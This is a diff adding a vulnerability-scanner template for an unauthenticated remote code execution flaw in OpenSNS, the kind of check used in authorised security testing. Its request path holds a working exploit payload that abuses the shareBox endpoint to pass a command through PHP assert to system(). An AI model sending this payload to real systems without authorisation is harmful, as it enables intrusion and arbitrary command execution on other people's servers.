@@ -1,0 +1,32 @@
+id: "opensns-rce"
+name: "OpenSNS - Remote Code Execution"
+severity: "critical"
+description: "OpenSNS allows remote unauthenticated attackers to execute arbitrary code via the 'shareBox' endpoint."
+tech:
+  - "php"
+tags:
+  - "opensns"
+  - "rce"
+  - "vuln"
+cwe: "CWE-77"
+spaExclusion: true
+request:
+  method: "GET"
+  path: "/index.php?s=weibo/Share/shareBox&query=app=Common%26model=Schedule%26method=runSchedule%26id[status]=1%26id[method]=Schedule-%3E_validationFieldItem%26id[4]=function%26[6][]=%26id[0]=cmd%26id[1]=assert%26id[args]=cmd=system(ver)"
+control:
+  method: "GET"
+  path: "/.guardian-none-{{rand}}"
+matchers-condition: "and"
+matchers:
+  - type: "regex"
+    part: "body"
+    regex:
+      - "uid=([0-9(a-z)]+)"
+      - "Microsoft Windows"
+  - type: "word"
+    part: "body"
+    words:
+      - "/Application/"
+  - type: "status"
+    status:
+      - 200
